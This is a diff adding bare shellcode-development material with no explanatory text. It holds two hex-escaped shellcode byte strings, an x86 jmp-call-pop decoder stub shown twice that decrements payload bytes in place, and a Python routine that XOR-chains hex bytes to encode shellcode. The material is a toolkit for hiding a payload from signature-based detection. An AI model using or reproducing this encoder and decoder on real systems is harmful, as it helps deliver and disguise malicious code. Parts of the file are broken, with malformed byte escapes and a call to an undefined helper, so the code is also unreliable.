@@ -1,1 +1,53 @@
 \x69\x80\x2\x2\x2\x67\x69\xc\xbe\x67\xb9\x68\x2\xb4\x3\x67\x54\x42\x32\xd3\xce\x81\x8a\xc4\x67\xb9\x6b\x2\x8a\xe2\xb3\x11\xce\x81\x51\x69\x6f\x30\x74\x69\x69\x30\x30\x63\x6a\x5\x4\x8a\xc2\xb1\x40\x4a\xce\x81\x76\xfa\x8a\xc9\xb3\xc\x93\x8a\xe4\xce\x81\x41\x32\xdc\xce\x81
+
+\x31\xf1\xf1\xea\xea\xf8\xa1\x17\x7e\x00\x00\x67\x0e\x63\xb6\xdb\xde\xdf\x66\xb2\xb1\x64\x35\x12\x70\xe3\x1f\x4d\x09\x4a\xa5\xde\xd2\x6b\x88\x68\x53\xa2\xdd\x4d\xd0\x38\x06\x41\x5c\x1b\x00\x47\x00\x4d\x0b\x6d\x07\x8a\x48\x71\x8f\x76\x84\x4d\xf5\x8c\x70\x41\x7a\xb9\x99\x1f\x91\x38\xad\x6a\x2e\x4d\xc0\x71\xea
+
+0:  eb 11                   jmp    0x13
+2:  5e                      pop    esi
+3:  31 c9                   xor    ecx,ecx
+5:  b1 08                   mov    cl,0x8
+7:  80 6c 0e ff 01          sub    BYTE PTR [esi+ecx*1-0x1],0x1
+c:  80 e9 01                sub    cl,0x1
+f:  75 f6                   jne    0x7
+11: eb 05                   jmp    0x18
+13: e8 ea ff ff ff          call   0x2
+
+
+
+
+jmp    0x13
+pop    esi
+xor    ecx,ecx
+mov    cl,0x8
+sub    BYTE PTR [esi+ecx*1-0x1],0x1
+sub    cl,0x1
+jne    0x7
+jmp    0x18
+call   0x2
+
+
+
+
+
+def decrypt(shellcode):
+    # shellcode_encode = ""
+    shellcode = shellcode.split(" ")
+    print("shellcode ==> ", shellcode)
+    shellcode_encode = shellcode[0]
+    print("shellcode ==> ", shellcode_encode)
+    # shellcode_encode = shellcode_encode + " " + intToStrHex(int(shellcode[i], 16))
+    edx = shellcode[0]
+    for i in range(1, len(shellcode)):
+        byte_code = int(shellcode[i], 16)
+        ########################################################################
+        byte_code = byte_code ^ int(edx, 16)
+        # byte_code = byte_code - i
+        ########################################################################
+        byte_code = intToStrHex(byte_code)
+        edx = byte_code
+
+        shellcode_encode = shellcode_encode + " " + byte_code
+    return shellcode_encode
+
+
+
